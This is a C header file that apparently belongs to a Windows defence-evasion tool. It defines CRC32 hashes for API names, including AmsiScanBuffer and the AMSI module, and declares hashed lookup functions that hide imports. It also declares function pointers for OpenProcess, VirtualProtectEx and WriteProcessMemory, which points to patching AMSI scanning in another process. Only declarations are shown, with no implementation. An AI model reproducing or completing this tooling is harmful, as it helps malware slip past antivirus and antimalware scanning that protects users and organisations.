#pragma once
#include <windows.h>
#include <TlHelp32.h>

#ifndef API_H
#define API_H

#define LoadLibraryA_CRC32					0x713C5123
#define FreeLibrary_CRC32                   0x2307D96D
#define VirtualProtectEx_CRC32				0x6022B086
#define WriteProcessMemory_CRC32			0x8F62A3DE
#define CreateToolhelp32Snapshot_CRC32		0x8EF931AC
#define Module32FirstW_CRC32				0xBE0DD30F
#define Module32NextW_CRC32					0x93BEF919
#define CloseHandle_CRC32					0x49FCEF16
#define OpenProcess_CRC32					0x2648ABA9
#define AmsiScanBuffer_CRC32				0xD2961CC0
#define KERNEL32_CRC32						0xD776BFB0
#define AMSI_CRC32							0xF9ED5173

typedef HMODULE(WINAPI* fnLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI* fnFreeLibrary)(HMODULE);
typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* fnModule32FirstW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnModule32NextW)(HANDLE, LPMODULEENTRY32W);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);

typedef struct _WIN32_API {
    fnLoadLibraryA              pLoadLibraryA;
    fnFreeLibrary               pFreeLibrary;
    fnVirtualProtectEx          pVirtualProtectEx;
    fnWriteProcessMemory        pWriteProcessMemory;
    fnCreateToolhelp32Snapshot  pCreateToolhelp32Snapshot;
    fnModule32FirstW            pModule32FirstW;
    fnModule32NextW             pModule32NextW;
    fnCloseHandle               pCloseHandle;
    fnOpenProcess               pOpenProcess;
} WIN32_API, * PWIN32_API;

DWORD CRC32BA(LPCSTR cString);
HMODULE GetModuleHandleH(UINT32 uDllNameHash);
LPVOID GetProcAddressH(HMODULE hModule, DWORD dwProcHash);

#endif // API_H
